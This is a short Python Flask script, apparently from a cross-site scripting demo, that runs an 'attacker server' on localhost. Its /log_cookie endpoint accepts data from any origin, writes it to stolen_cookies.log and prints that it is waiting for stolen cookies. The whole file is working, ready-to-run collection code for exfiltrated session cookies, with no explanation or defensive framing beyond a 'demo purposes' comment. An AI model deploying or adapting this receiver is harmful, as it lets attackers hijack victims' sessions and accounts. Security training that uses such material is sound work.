from flask import Flask, request, jsonify
from flask_cors import CORS # Import CORS
import datetime

app = Flask(__name__)
CORS(app) # Enable CORS for all routes (for demo purposes)

ATTACKER_PORT = 5001 

@app.route('/log_cookie', methods=['POST'])
def log_cookie():
    data = request.data.decode('utf-8')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open('stolen_cookies.log', 'a') as f:
        f.write(f"[{timestamp}] Received stolen data:\n{data}\n---\n")
    
    print(f"[{timestamp}] Attacker server received data:\n{data}\n")
    return jsonify({"status": "success", "message": "Data received by attacker"}), 200

if __name__ == '__main__':
    print(f"Attacker server running on http://127.0.0.1:{ATTACKER_PORT}/")
    print("Waiting to receive stolen cookies...")
    app.run(port=ATTACKER_PORT, debug=True)